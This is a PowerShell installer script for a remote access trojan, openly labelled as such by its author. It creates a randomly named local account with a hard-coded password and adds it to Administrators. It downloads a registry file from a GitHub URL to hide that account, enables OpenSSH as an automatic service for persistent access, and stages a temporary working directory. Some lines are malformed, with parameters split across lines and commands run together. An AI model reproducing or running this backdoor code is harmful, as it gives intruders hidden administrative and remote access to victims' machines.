# builds resources for rat
# created by : jfrdgh (@bigmanlc on dc)

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %  {[char]$_})
}


# create local admin for rat
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname"
        -pword $pword -FullName
        "$uname" -Description
        "Temporary Local Admin"
        Write-Verbose
        "$uname local user created"
        Add-LocalGroupMember
        -Group "Administrators"
        -Member "$uname"
    }
    end { 
    }
}

# create admin user
$uname = random_text
$pword = (ConvertTo-SecureString "QuentionABC123" -AsPlainText -Force)
create_account -uname $uname -pword $pword

# registry to hide local admin
$vbs_script = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention/main/admin.reg -OutFile "$vbs_script.reg"

# goto temp
$wd = random_text
$path = "$env:TEMP/$wd"
$initial_dir = Get-Location
$pocpath = "$env:TEMP/poc"

# enabling persistant ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service sshd Set-Service -Name sshd -StartupType 'Automatic' Get-NetFirewallRule -Name *ssh*

# make working directory
mkdir $path
cd $path

# cd $initial_dir
# del installer.ps1